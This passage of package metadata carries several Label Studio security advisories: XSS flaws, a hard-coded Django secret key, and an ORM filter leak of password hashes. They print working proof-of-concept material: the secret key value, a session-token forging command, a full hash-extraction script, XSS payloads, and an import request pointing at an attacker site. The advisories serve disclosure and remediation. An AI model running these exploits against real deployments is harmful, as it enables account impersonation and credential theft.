get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.7.2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 